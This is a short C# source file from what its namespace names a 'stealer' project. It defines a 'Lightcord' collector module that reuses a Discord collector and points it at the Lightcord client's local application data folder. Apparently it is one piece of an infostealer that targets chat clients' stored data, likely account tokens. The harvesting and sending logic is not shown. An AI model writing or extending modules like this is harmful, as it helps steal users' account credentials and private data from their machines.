using System.IO;
using System;

namespace MyStealer.Collectors.Browser.ChromiumBased
{
    public class Lightcord : Discord
    {
        public override string ModuleName => "Lightcord";

        protected override string UserDataPath => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Lightcord");
    }
}
